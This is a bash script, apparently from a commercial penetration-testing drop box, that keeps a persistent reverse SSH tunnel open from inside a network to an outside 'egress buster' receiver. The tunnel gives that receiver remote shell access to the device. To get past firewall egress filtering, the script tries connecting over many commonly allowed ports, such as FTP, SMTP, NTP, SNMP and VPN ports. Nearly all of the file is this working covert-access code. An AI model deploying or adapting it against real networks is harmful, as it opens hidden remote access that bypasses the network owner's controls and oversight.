#!/bin/bash
# Copyright 2010-2015 Rapid Focus Security, LLC
# pwnieexpress.com
#
# This script contains proprietary software distributed under the terms of the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Use of this software signifies your agreement to the Rapid Focus Security, LLC End User License Agreement (EULA).
#
# Rapid Focus Security, LLC EULA: http://pwnieexpress.com/pdfs/RFSEULA.pdf
#
# Revision: 4.12.2012

# Get user variables from script_configs
# EgressBuster_receiver=
. /var/pwnplug/script_configs/SSH_egress_buster_config.sh

# Set SSH variables
SSH_listener_port=3334
SSH_user=pwnplug
SSH_key="/root/.ssh/id_rsa"
Tunnel_status=`ps -C ssh -o pid,args |grep -o "${SSH_listener_port}:localhost:22"`
AUTOSSH_PID=`ps -C autossh -o pid,args |grep "autossh -2NR ${SSH_listener_port}" |awk '{print$1}'`
SSH_ChildProcess_PID=`ps -C ssh -o pid,args |grep "${SSH_listener_port}:localhost:22" |awk '{print$1}'`

# Set standard autossh variables
export AUTOSSH_FIRST_POLL=60
export AUTOSSH_POLL=60
export AUTOSSH_GATETIME=30
export AUTOSSH_LOGFILE=/var/log/autossh.log
export AUTOSSH_DEBUG=yes
export AUTOSSH_PATH=/usr/bin/ssh

# Set tunnel-specific autossh variables
export AUTOSSH_PORT=22094
export AUTOSSH_PIDFILE=/var/run/Buster_autossh.pid

# If tunnel already established, do nothing. If not, attempt connect.
if [ "${Tunnel_status}" == "${SSH_listener_port}:localhost:22" ] ; then echo connected ; \
else \
kill ${AUTOSSH_PID}; \
kill ${SSH_ChildProcess_PID}; \
sleep 1

if [ "$enable21" == "YES" ] ; then \
echo "21 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 21 ; \
else echo "21 not enabled" ; \
fi

if [ "$enable22" == "YES" ] ; then \
echo "22 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 22 ; \
else echo "22 not enabled" ; \
fi

if [ "$enable23" == "YES" ] ; then \
echo "23 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 23 ; \
else echo "23 not enabled" ; \
fi

if [ "$enable25" == "YES" ] ; then \
echo "25 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 25 ; \
else echo "25 not enabled" ; \
fi

if [ "$enable110" == "YES" ] ; then \
echo "110 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 110 ; \
else echo "110 not enabled" ; \
fi

if [ "$enable123" == "YES" ] ; then \
echo "123 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 123 ; \
else echo "123 not enabled" ; \
fi

if [ "$enable161" == "YES" ] ; then \
echo "161 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 161 ; \
else echo "161 not enabled" ; \
fi

if [ "$enable500" == "YES" ] ; then \
echo "500 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 500 ; \
else echo "500 not enabled" ; \
fi

if [ "$enable1723" == "YES" ] ; then \
echo "1723 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 1723 ; \
else echo "1723 not enabled" ; \
fi

if [ "$enable4500" == "YES" ] ; then \
echo "4500 enabled" ; \
autossh -2NR ${SSH_listener_port}:localhost:22 -i "$SSH_key" "$SSH_user"@"$EgressBuster_receiver" -p 4500 ; \
else echo "4500 not enabled" ; \
fi

fi
